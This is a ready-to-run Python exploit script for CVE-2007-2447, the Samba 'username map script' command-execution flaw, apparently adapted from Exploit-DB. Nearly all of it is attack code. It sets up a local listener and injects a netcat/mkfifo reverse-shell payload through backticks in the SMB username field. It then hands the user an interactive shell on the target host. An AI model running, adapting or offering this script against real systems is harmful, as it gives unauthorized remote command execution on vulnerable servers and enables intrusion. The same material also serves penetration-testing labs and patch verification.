# Exploit Title: Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution
# Source: https://www.exploit-db.com/exploits/16320
# CVE: CVE-2007-2447

#!/usr/bin/python3

import argparse
import socket
import netifaces as ni
from pwn import * # pip install pwntools
from smb.SMBConnection import SMBConnection # pip install pysmb

parser = argparse.ArgumentParser()
parser.add_argument("ip", help="input the ip of the host", type=str)
parser.add_argument("adapter", help="input your network adapter (ex: tun0)", type=str)
parser.add_argument(
    "-port", help="input the port (Samba 3.0.20 < 3.0.25rc3)", type=int, default=139)

args = parser.parse_args()
ip = args.ip
adapter = args.adapter
port = args.port

print("\n\tSamba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution\n")

# get adapter ip and open port
local_ip = ni.ifaddresses(adapter)[ni.AF_INET][0]['addr']
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("127.0.0.1",0))
s.listen(1)
s.getsockname()[1]
local_port = s.getsockname()[1]
s.close()

# set listener
listener = listen(local_port)

# smb rce
# credit: https://github.com/pulkit-mital/samba-usermap-script/blob/main/samba_usermap_script.py
payload = f'mkfifo /tmp/usermap; nc {local_ip} {local_port} 0</tmp/usermap | /bin/sh >/tmp/usermap 2>&1; rm /tmp/usermap'
username = "/=`nohup " + payload + "`"
smb = SMBConnection(username, "", "", "")
try:
    smb.connect(ip, port, timeout=1)
except:
    smb.close()
    print("\tPayload Sent")

# reverse shell
listener.interactive()
listener.close()